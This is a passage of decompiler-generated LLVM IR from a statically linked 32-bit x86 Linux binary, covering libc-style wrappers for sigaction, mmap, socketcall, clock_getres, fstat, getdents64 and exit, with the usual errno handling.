  %v7_8051b2e = icmp ult i32 %v1_8051b2d, %v1_8051b2e
  br i1 %v7_8051b2e, label %dec_label_pc_8051b26, label %dec_label_pc_8051b32

dec_label_pc_8051b32:                             ; preds = %dec_label_pc_8051b26, %dec_label_pc_8051b0e
  %v0_8051b3b = load i32, i32* %stack_var_-164, align 4
  %v1_8051b3b = call i32 @function_804ffeb(i32 %v0_8051b3b)
  %v1_8051b40 = inttoptr i32 %v1_8051b3b to i32*
  store i32 0, i32* %v1_8051b40, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-164, align 4
  %v0_8051b5b = load i32, i32* @global_var_8053140.65, align 64
  store i32 %v0_8051b5b, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_80519bf)
  %v0_8051b70 = load i32, i32* @eax, align 4
  %v1_8051b73 = call i32 @function_80515d3(i32 %v0_8051b70)
  %v0_8051b7d = load i32, i32* @ebx, align 4
  %v1_8051b7d = inttoptr i32 %v0_8051b7d to %sigcontext*
  %v2_8051b7d = call i32 @sigreturn(%sigcontext* %v1_8051b7d)
  %v0_8051b85 = load i32, i32* @ebx, align 4
  %v1_8051b85 = inttoptr i32 %v0_8051b85 to %sigcontext*
  %v2_8051b85 = call i32 @sigreturn(%sigcontext* %v1_8051b85)
  ret i32 %v2_8051b85

; uselistorder directives
  uselistorder i32 %v1_8051b2d, { 1, 2, 0 }
  uselistorder i32 %v1_8051b09, { 1, 2, 0 }
  uselistorder i32 %v2_8051a49, { 1, 0 }
  uselistorder i32 %v1_8051a46, { 2, 1, 0 }
  uselistorder i32 %v1_8051a25, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051a22, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_80515d3, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), i32 2), { 1, 3, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8053000.57 to i32), i32 -134557696), { 0, 2, 1 }
  uselistorder i32 ()* @function_805194b, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051b26, { 1, 0 }
  uselistorder label %dec_label_pc_8051b02, { 1, 0 }
  uselistorder label %dec_label_pc_8051add, { 1, 0 }
  uselistorder label %dec_label_pc_8051a46, { 1, 0 }
  uselistorder label %dec_label_pc_8051a2e, { 1, 0 }
}

define i32 @function_8051b87(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051b87:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051b87 = load i32, i32* @esi, align 4
  %v0_8051b88 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8051b9d = icmp eq i32* %arg2, null
  br i1 %v1_8051b9d, label %dec_label_pc_8051b87.dec_label_pc_8051bf0_crit_edge, label %dec_label_pc_8051ba1

dec_label_pc_8051b87.dec_label_pc_8051bf0_crit_edge: ; preds = %dec_label_pc_8051b87
  br label %dec_label_pc_8051bf0

dec_label_pc_8051ba1:                             ; preds = %dec_label_pc_8051b87
  %v2_8051ba1 = load i32, i32* %arg2, align 4
  store i32 %v2_8051ba1, i32* %stack_var_-148, align 4
  %v1_8051baa = add i32 %tmp11, 4
  %v3_8051bbc = bitcast i32* %stack_var_-136 to i16*
  %v4_8051bbc = call i32 @function_805220a(i16* %v3_8051bbc, i32 %v1_8051baa, i32 128)
  br label %dec_label_pc_8051bf0

dec_label_pc_8051bf0:                             ; preds = %dec_label_pc_8051b87.dec_label_pc_8051bf0_crit_edge, %dec_label_pc_8051ba1
  %v1_8051bf2 = icmp eq i32 %arg3, 0
  %v2_8051bf6 = ptrtoint i32* %stack_var_-288 to i32
  %.v2_8051bf6 = select i1 %v1_8051bf2, i32 0, i32 %v2_8051bf6
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_8051c0a = select i1 %v1_8051b9d, %sigaction* null, %sigaction* %phitmp
  %v5_8051c12 = call i32 @function_8051cad(i32 %arg1, %sigaction* %v0_8051c0a, i32 %.v2_8051bf6, i32 8)
  store i32 %v5_8051c12, i32* %ebx.global-to-local, align 4
  %v2_8051c20 = icmp slt i32 %v5_8051c12, 0
  %or.cond = or i1 %v1_8051bf2, %v2_8051c20
  br i1 %or.cond, label %dec_label_pc_8051c55, label %dec_label_pc_8051c24

dec_label_pc_8051c24:                             ; preds = %dec_label_pc_8051bf0
  %v3_8051c24 = load i32, i32* %stack_var_-288, align 4
  %v2_8051c28 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8051c24, i32* %v2_8051c28, align 4
  %v2_8051c30 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8051c35 = add i32 %arg3, 4
  %v3_8051c39 = inttoptr i32 %v1_8051c35 to i16*
  %v4_8051c39 = call i32 @function_805220a(i16* %v3_8051c39, i32 %v2_8051c30, i32 128)
  %v2_8051c42 = add i32 %arg3, 132
  %v3_8051c42 = inttoptr i32 %v2_8051c42 to i32*
  %v2_8051c4f = add i32 %arg3, 136
  %v3_8051c4f = inttoptr i32 %v2_8051c4f to i32*
  %v0_8051c55.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c55

dec_label_pc_8051c55:                             ; preds = %dec_label_pc_8051bf0, %dec_label_pc_8051c24
  %v0_8051c55 = phi i32 [ %v5_8051c12, %dec_label_pc_8051bf0 ], [ %v0_8051c55.pre, %dec_label_pc_8051c24 ]
  store i32 %v0_8051b88, i32* @ebx, align 4
  store i32 %v0_8051b87, i32* @esi, align 4
  ret i32 %v0_8051c55

; uselistorder directives
  uselistorder i32 128, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_8051c55, { 1, 0 }
  uselistorder label %dec_label_pc_8051bf0, { 1, 0 }
}

define i32 @function_8051c60(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051c60:
  %stack_var_4 = alloca i32, align 4
  %v0_8051c60 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c60, i32* @edx, align 4
  %v2_8051c6b = load i32, i32* @ecx, align 4
  %v4_8051c6b = load i32, i32* @esi, align 4
  %v5_8051c6b = load i32, i32* @edi, align 4
  %v6_8051c6b = load i32, i32* @ebp, align 4
  %v7_8051c6b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8051c6b, i32 %v0_8051c60, i32 %v4_8051c6b, i32 %v5_8051c6b, i32 %v6_8051c6b)
  %v8_8051c6b = ptrtoint i32* %v7_8051c6b to i32
  store i32 %v0_8051c60, i32* @ebx, align 4
  %v3_8051c74 = icmp ugt i32* %v7_8051c6b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8051c74, i32 134554405)
  ret i32 %v8_8051c6b

; uselistorder directives
  uselistorder i32* @ebp, { 1, 34, 18, 19, 20, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 16, 12, 13, 14, 15, 0, 17, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35 }
  uselistorder i32* @ecx, { 3, 33, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 4, 5, 1, 6, 35, 34, 28, 29, 2, 30, 31, 32 }
}

define i32 @function_8051c7b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051c7b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051c7b = load i32, i32* @ebx, align 4
  store i32 %v0_8051c7b, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051c8e = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051c8e, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8051c8e, -4095
  br i1 %tmp9, label %dec_label_pc_8051ca7, label %dec_label_pc_8051c9b

dec_label_pc_8051c9b:                             ; preds = %dec_label_pc_8051c7b
  %v1_8051c9b = call i32 @function_804ffeb(i32 %v0_8051c7b)
  %v0_8051ca0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ca0 = sub i32 0, %v0_8051ca0
  %v2_8051ca2 = inttoptr i32 %v1_8051c9b to i32*
  store i32 %v1_8051ca0, i32* %v2_8051ca2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051cab.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051ca7

dec_label_pc_8051ca7:                             ; preds = %dec_label_pc_8051c7b, %dec_label_pc_8051c9b
  %v2_8051cab = phi i32 [ %v0_8051c7b, %dec_label_pc_8051c7b ], [ %v2_8051cab.pre, %dec_label_pc_8051c9b ]
  %v0_8051ca7 = phi i32 [ %v1_8051c8e, %dec_label_pc_8051c7b ], [ -1, %dec_label_pc_8051c9b ]
  %v2_8051ca9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ca9, i32* @edx, align 4
  store i32 %v2_8051cab, i32* @ebx, align 4
  ret i32 %v0_8051ca7

; uselistorder directives
  uselistorder i32 %v1_8051c8e, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051ca7, { 1, 0 }
}

define i32 @function_8051cad(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051cad:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051cae = load i32, i32* @esi, align 4
  store i32 %v0_8051cae, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051cc2 = load i32, i32* @ebx, align 4
  %v7_8051cca = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051cca, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8051cca, -4095
  br i1 %tmp14, label %dec_label_pc_8051ce2, label %dec_label_pc_8051cd6

dec_label_pc_8051cd6:                             ; preds = %dec_label_pc_8051cad
  %v1_8051cd6 = call i32 @function_804ffeb(i32 %v0_8051cc2)
  %v0_8051cdb = load i32, i32* %esi.global-to-local, align 4
  %v1_8051cdb = sub i32 0, %v0_8051cdb
  %v2_8051cdd = inttoptr i32 %v1_8051cd6 to i32*
  store i32 %v1_8051cdb, i32* %v2_8051cdd, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051ce5.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051ce2

dec_label_pc_8051ce2:                             ; preds = %dec_label_pc_8051cad, %dec_label_pc_8051cd6
  %v2_8051ce5 = phi i32 [ %v0_8051cae, %dec_label_pc_8051cad ], [ %v2_8051ce5.pre, %dec_label_pc_8051cd6 ]
  %v0_8051ce2 = phi i32 [ %v7_8051cca, %dec_label_pc_8051cad ], [ -1, %dec_label_pc_8051cd6 ]
  store i32 %v2_8051ce5, i32* @esi, align 4
  ret i32 %v0_8051ce2

; uselistorder directives
  uselistorder i32 %v7_8051cca, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051ce2, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8051ce8(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8051ce8:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8051d10(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051d10:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d10 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d10, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8051d23 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8051d23, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051d23, -4095
  br i1 %tmp10, label %dec_label_pc_8051d3c, label %dec_label_pc_8051d30

dec_label_pc_8051d30:                             ; preds = %dec_label_pc_8051d10
  %v1_8051d30 = call i32 @function_804ffeb(i32 %v0_8051d10)
  %v0_8051d35 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d35 = sub i32 0, %v0_8051d35
  %v2_8051d37 = inttoptr i32 %v1_8051d30 to i32*
  store i32 %v1_8051d35, i32* %v2_8051d37, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051d40.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051d3c

dec_label_pc_8051d3c:                             ; preds = %dec_label_pc_8051d10, %dec_label_pc_8051d30
  %v2_8051d40 = phi i32 [ %v0_8051d10, %dec_label_pc_8051d10 ], [ %v2_8051d40.pre, %dec_label_pc_8051d30 ]
  %v0_8051d3c = phi i32 [ %v4_8051d23, %dec_label_pc_8051d10 ], [ -1, %dec_label_pc_8051d30 ]
  %v2_8051d3e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051d3e, i32* @edx, align 4
  store i32 %v2_8051d40, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051d3c

; uselistorder directives
  uselistorder i32 %v4_8051d23, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051d3c, { 1, 0 }
}

define i32 @function_8051d42(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051d42:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051d42 = load i32, i32* @ebx, align 4
  store i32 %v0_8051d42, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8051d55 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8051d55, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8051d55, -4095
  br i1 %tmp13, label %dec_label_pc_8051d70, label %dec_label_pc_8051d62

dec_label_pc_8051d62:                             ; preds = %dec_label_pc_8051d42
  %v1_8051d62 = call i32 @function_804ffeb(i32 %v0_8051d42)
  %v0_8051d67 = load i32, i32* @ebx, align 4
  %v1_8051d67 = sub i32 0, %v0_8051d67
  %v2_8051d69 = inttoptr i32 %v1_8051d62 to i32*
  store i32 %v1_8051d67, i32* %v2_8051d69, align 4
  %v2_8051d88.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051d83

dec_label_pc_8051d70:                             ; preds = %dec_label_pc_8051d42
  %v1_8051d70 = icmp eq i32 %v4_8051d55, 0
  %v1_8051d72 = icmp eq i1 %v1_8051d70, false
  br i1 %v1_8051d72, label %dec_label_pc_8051d83, label %dec_label_pc_8051d74

dec_label_pc_8051d74:                             ; preds = %dec_label_pc_8051d70
  %v4_8051d7b = bitcast i32* %stack_var_-68 to i16*
  %v5_8051d7b = call i32 @function_805218d(i16* %v4_8051d7b, i32 %arg2, i32 %v4_8051d55, i32 %v4_8051d55)
  %v0_8051d83.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051d83

dec_label_pc_8051d83:                             ; preds = %dec_label_pc_8051d70, %dec_label_pc_8051d62, %dec_label_pc_8051d74
  %v2_8051d88 = phi i32 [ %v0_8051d42, %dec_label_pc_8051d70 ], [ %v2_8051d88.pre, %dec_label_pc_8051d62 ], [ %v0_8051d42, %dec_label_pc_8051d74 ]
  %v0_8051d83 = phi i32 [ %v4_8051d55, %dec_label_pc_8051d70 ], [ -1, %dec_label_pc_8051d62 ], [ %v0_8051d83.pre, %dec_label_pc_8051d74 ]
  store i32 %v2_8051d88, i32* @ebx, align 4
  ret i32 %v0_8051d83

; uselistorder directives
  uselistorder i32 %v4_8051d55, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8051d83, { 2, 0, 1 }
}

define i32 @function_8051d8a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051d8a:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051d8a = load i32, i32* @edi, align 4
  %v0_8051d8b = load i32, i32* @esi, align 4
  %v0_8051d8c = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8051d91 = load i32, i32* @edx, align 4
  %v7_8051d9b = inttoptr i32 %arg2 to i32*
  %v8_8051d9b = call i32 @function_8051df9(i32 %arg1, i32* %v7_8051d9b, i32 %arg3, i32 %v0_8051d91, i32 %v0_8051d8c, i32 %v0_8051d8b, i32 %v0_8051d8a)
  store i32 %v8_8051d9b, i32* %eax.global-to-local, align 4
  store i32 %v8_8051d9b, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8051d9b, 1
  br i1 %tmp24, label %dec_label_pc_8051df3, label %dec_label_pc_8051da9

dec_label_pc_8051da9:                             ; preds = %dec_label_pc_8051d8a
  %v0_8051da9 = load i32, i32* @ebx, align 4
  %v2_8051da9 = add i32 %v0_8051da9, %v8_8051d9b
  store i32 %v2_8051da9, i32* @edi, align 4
  %v7_8051def4 = icmp ult i32 %v0_8051da9, %v2_8051da9
  br i1 %v7_8051def4, label %dec_label_pc_8051dae, label %dec_label_pc_8051df3

dec_label_pc_8051dae:                             ; preds = %dec_label_pc_8051da9, %dec_label_pc_8051dae
  %v0_8051dae = phi i32 [ %v2_8051ded, %dec_label_pc_8051dae ], [ %v0_8051da9, %dec_label_pc_8051da9 ]
  %v1_8051dae = add i32 %v0_8051dae, 8
  %v2_8051dae = inttoptr i32 %v1_8051dae to i32*
  %v3_8051dae = load i32, i32* %v2_8051dae, align 4
  store i32 %v3_8051dae, i32* %eax.global-to-local, align 4
  %v2_8051db1 = add i32 %v0_8051dae, 4
  %v3_8051db1 = inttoptr i32 %v2_8051db1 to i32*
  store i32 %v3_8051dae, i32* %v3_8051db1, align 4
  %v0_8051db4 = load i32, i32* @ebx, align 4
  %v1_8051db4 = add i32 %v0_8051db4, 16
  %v2_8051db4 = inttoptr i32 %v1_8051db4 to i32*
  %v3_8051db4 = load i32, i32* %v2_8051db4, align 4
  store i32 %v3_8051db4, i32* %eax.global-to-local, align 4
  %v1_8051db7 = trunc i32 %v3_8051db4 to i16
  %v3_8051db7 = add i32 %v0_8051db4, 8
  %v4_8051db7 = inttoptr i32 %v3_8051db7 to i16*
  store i16 %v1_8051db7, i16* %v4_8051db7, align 2
  %v0_8051dbb = load i32, i32* @ebx, align 4
  %v1_8051dbb = add i32 %v0_8051dbb, 18
  %v2_8051dbb = inttoptr i32 %v1_8051dbb to i8*
  %v3_8051dbb = load i8, i8* %v2_8051dbb, align 1
  %v4_8051dbb = zext i8 %v3_8051dbb to i32
  %v5_8051dbb = load i32, i32* %eax.global-to-local, align 4
  %v6_8051dbb = and i32 %v5_8051dbb, -256
  %v7_8051dbb = or i32 %v6_8051dbb, %v4_8051dbb
  store i32 %v7_8051dbb, i32* %eax.global-to-local, align 4
  %v3_8051dbe = add i32 %v0_8051dbb, 10
  %v4_8051dbe = inttoptr i32 %v3_8051dbe to i8*
  store i8 %v3_8051dbb, i8* %v4_8051dbe, align 1
  %v0_8051dc2 = load i32, i32* @ebx, align 4
  %v1_8051dc2 = add i32 %v0_8051dc2, 8
  %v2_8051dc2 = inttoptr i32 %v1_8051dc2 to i16*
  %v3_8051dc2 = load i16, i16* %v2_8051dc2, align 2
  %v4_8051dc2 = zext i16 %v3_8051dc2 to i32
  %v1_8051dc6 = add nsw i32 %v4_8051dc2, -19
  %v1_8051dca = add i32 %v0_8051dc2, 19
  %v1_8051dce = add i32 %v0_8051dc2, 11
  store i32 %v1_8051dce, i32* %eax.global-to-local, align 4
  %v3_8051dd2 = inttoptr i32 %v1_8051dce to i8*
  %v4_8051dd2 = call i32 @function_8050015(i8* %v3_8051dd2, i32 %v1_8051dca, i32 %v1_8051dc6)
  store i32 %v4_8051dd2, i32* %eax.global-to-local, align 4
  %v0_8051dda = load i32, i32* @ebx, align 4
  %v1_8051dda = add i32 %v0_8051dda, 8
  %v2_8051dda = inttoptr i32 %v1_8051dda to i16*
  %v3_8051dda = load i16, i16* %v2_8051dda, align 2
  %v4_8051dda = zext i16 %v3_8051dda to i32
  store i32 %v4_8051dda, i32* %eax.global-to-local, align 4
  %v3_8051de1 = inttoptr i32 %v0_8051dda to i8*
  %v4_8051de1 = call i32 @function_8050015(i8* %v3_8051de1, i32 %v0_8051dda, i32 %v4_8051dda)
  store i32 %v4_8051de1, i32* %eax.global-to-local, align 4
  %v0_8051de6 = load i32, i32* @ebx, align 4
  %v1_8051de6 = add i32 %v0_8051de6, 8
  %v2_8051de6 = inttoptr i32 %v1_8051de6 to i16*
  %v3_8051de6 = load i16, i16* %v2_8051de6, align 2
  %v4_8051de6 = zext i16 %v3_8051de6 to i32
  store i32 %v4_8051de6, i32* %eax.global-to-local, align 4
  %v2_8051ded = add i32 %v4_8051de6, %v0_8051de6
  store i32 %v2_8051ded, i32* @ebx, align 4
  %v1_8051def = load i32, i32* @edi, align 4
  %v7_8051def = icmp ult i32 %v2_8051ded, %v1_8051def
  br i1 %v7_8051def, label %dec_label_pc_8051dae, label %dec_label_pc_8051def.dec_label_pc_8051df3.loopexit_crit_edge

dec_label_pc_8051def.dec_label_pc_8051df3.loopexit_crit_edge: ; preds = %dec_label_pc_8051dae
  %v0_8051df3.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051df3

dec_label_pc_8051df3:                             ; preds = %dec_label_pc_8051da9, %dec_label_pc_8051def.dec_label_pc_8051df3.loopexit_crit_edge, %dec_label_pc_8051d8a
  %v0_8051df3 = phi i32 [ %v8_8051d9b, %dec_label_pc_8051d8a ], [ %v0_8051df3.pre.pre, %dec_label_pc_8051def.dec_label_pc_8051df3.loopexit_crit_edge ], [ %v8_8051d9b, %dec_label_pc_8051da9 ]
  store i32 %v0_8051df3, i32* %eax.global-to-local, align 4
  store i32 %v0_8051d8b, i32* @esi, align 4
  store i32 %v0_8051d8a, i32* @edi, align 4
  ret i32 %v0_8051df3

; uselistorder directives
  uselistorder i32 %v0_8051df3, { 1, 0 }
  uselistorder i32 %v2_8051ded, { 1, 2, 0 }
  uselistorder i32 %v0_8051dda, { 1, 0, 2 }
  uselistorder i32 %v0_8051dc2, { 1, 0, 2 }
  uselistorder i32 %v0_8051dae, { 1, 0 }
  uselistorder i32 %v0_8051da9, { 0, 2, 1 }
  uselistorder i32 %v8_8051d9b, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_8050015, { 0, 1, 3, 2 }
  uselistorder i32 11, { 5, 3, 4, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_8051df3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051dae, { 1, 0 }
}

define i32 @function_8051df9(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8051df9:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8051dfc = load i32, i32* @edi, align 4
  %v0_8051dfe = load i32, i32* @ebx, align 4
  %v15_8051dff = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8051e08 = add i32 %arg3, 30
  %v1_8051e0e = and i32 %v1_8051e08, -16
  %v2_8051e11 = sub i32 %v15_8051dff, %v1_8051e0e
  %v1_8051e13 = add i32 %v2_8051e11, 15
  %v1_8051e17 = and i32 %v1_8051e13, -16
  %v1_8051e1d = inttoptr i32 %v1_8051e17 to %linux_dirent64*
  store i32 %v1_8051e17, i32* %ecx.global-to-local, align 4
  %v2_8051e1f = add i32 %v2_8051e11, -4
  %v3_8051e1f = inttoptr i32 %v2_8051e1f to i32*
  store i32 %v0_8051dfe, i32* %v3_8051e1f, align 4
  %v0_8051e20 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8051e27 = call i32 @getdents64(i32 %v0_8051e20, %linux_dirent64* %v1_8051e1d, i32 %arg3)
  store i32 %v5_8051e27, i32* %eax.global-to-local, align 4
  %v0_8051e29 = load i32, i32* @esp, align 4
  %v3_8051e29 = add i32 %v0_8051e29, 4
  %tmp39 = icmp ult i32 %v5_8051e27, -4095
  br i1 %tmp39, label %dec_label_pc_8051e49, label %dec_label_pc_8051e34

dec_label_pc_8051e34:                             ; preds = %dec_label_pc_8051df9
  %v1_8051e34 = call i32 @function_804ffeb(i32 %v5_8051e27)
  store i32 %v1_8051e34, i32* %eax.global-to-local, align 4
  %v4_8051e39 = sub i32 0, %v5_8051e27
  %v2_8051e3f = inttoptr i32 %v1_8051e34 to i32*
  store i32 %v4_8051e39, i32* %v2_8051e3f, align 4
  br label %dec_label_pc_8051f05

dec_label_pc_8051e49:                             ; preds = %dec_label_pc_8051df9
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8051e17, i32* @ebx, align 4
  %v5_8051ef5 = add i32 %v5_8051e27, %v1_8051e17
  store i32 %v5_8051ef5, i32* %eax.global-to-local, align 4
  %v7_8051ef829 = icmp ult i32 %v1_8051e17, %v5_8051ef5
  br i1 %v7_8051ef829, label %dec_label_pc_8051e62.lr.ph, label %dec_label_pc_8051f00

dec_label_pc_8051e62.lr.ph:                       ; preds = %dec_label_pc_8051e49
  %v5_8051e6f = add i32 %tmp14, %arg3
  br label %dec_label_pc_8051e62

dec_label_pc_8051e62:                             ; preds = %dec_label_pc_8051e62.lr.ph, %dec_label_pc_8051ea4
  %stack_var_-32.034 = phi i32 [ -1, %dec_label_pc_8051e62.lr.ph ], [ %v3_8051ea7, %dec_label_pc_8051ea4 ]
  %stack_var_-36.033 = phi i32 [ -1, %dec_label_pc_8051e62.lr.ph ], [ %v3_8051ea4, %dec_label_pc_8051ea4 ]
  %v0_8051eb032 = phi i32 [ %v1_8051e17, %dec_label_pc_8051e62.lr.ph ], [ %v2_8051eed, %dec_label_pc_8051ea4 ]
  %v1_8051eb531 = phi i32 [ %tmp14, %dec_label_pc_8051e62.lr.ph ], [ %v2_8051e72, %dec_label_pc_8051ea4 ]
  %v0_8051e7c30 = phi i32 [ %v3_8051e29, %dec_label_pc_8051e62.lr.ph ], [ %v1_8051eef, %dec_label_pc_8051ea4 ]
  %v1_8051e62 = add i32 %v0_8051eb032, 16
  %v2_8051e62 = inttoptr i32 %v1_8051e62 to i16*
  %v3_8051e62 = load i16, i16* %v2_8051e62, align 2
  %v4_8051e62 = zext i16 %v3_8051e62 to i32
  %v1_8051e66 = add nuw nsw i32 %v4_8051e62, 3
  %v1_8051e6c = and i32 %v1_8051e66, 131068
  store i32 %v1_8051e6c, i32* %ecx.global-to-local, align 4
  store i32 %v5_8051e6f, i32* %eax.global-to-local, align 4
  %v2_8051e72 = add i32 %v1_8051e6c, %v1_8051eb531
  %tmp40 = icmp ugt i32 %v2_8051e72, %v5_8051e6f
  br i1 %tmp40, label %dec_label_pc_8051e7c, label %dec_label_pc_8051ea4

dec_label_pc_8051e7c:                             ; preds = %dec_label_pc_8051e62
  %v1_8051e7c = add i32 %v0_8051e7c30, -4
  %v2_8051e7c = inttoptr i32 %v1_8051e7c to i32*
  store i32 0, i32* %v2_8051e7c, align 4
  %v5_8051e7e = add i32 %v0_8051e7c30, -8
  %v6_8051e7e = inttoptr i32 %v5_8051e7e to i32*
  store i32 %stack_var_-32.034, i32* %v6_8051e7e, align 4
  %v5_8051e81 = add i32 %v0_8051e7c30, -12
  %v6_8051e81 = inttoptr i32 %v5_8051e81 to i32*
  store i32 %stack_var_-36.033, i32* %v6_8051e81, align 4
  %v5_8051e84 = add i32 %v0_8051e7c30, -16
  %v6_8051e84 = inttoptr i32 %v5_8051e84 to i32*
  store i32 %arg1, i32* %v6_8051e84, align 4
  %v1_8051e87 = call i32 @function_805200f(i32 %v2_8051e72)
  store i32 %v1_8051e87, i32* %eax.global-to-local, align 4
  %v0_8051e8f = load i32, i32* @esi, align 4
  %v15_8051e8f = icmp eq i32 %v0_8051e8f, %tmp14
  %v1_8051e92 = icmp eq i1 %v15_8051e8f, false
  br i1 %v1_8051e92, label %dec_label_pc_8051f00, label %dec_label_pc_8051e94

dec_label_pc_8051e94:                             ; preds = %dec_label_pc_8051e7c
  %v1_8051e94 = call i32 @function_804ffeb(i32 %v2_8051e72)
  store i32 %v1_8051e94, i32* %eax.global-to-local, align 4
  %v1_8051e99 = inttoptr i32 %v1_8051e94 to i32*
  store i32 22, i32* %v1_8051e99, align 4
  br label %dec_label_pc_8051f05

dec_label_pc_8051ea4:                             ; preds = %dec_label_pc_8051e62
  %v1_8051ea4 = add i32 %v0_8051eb032, 8
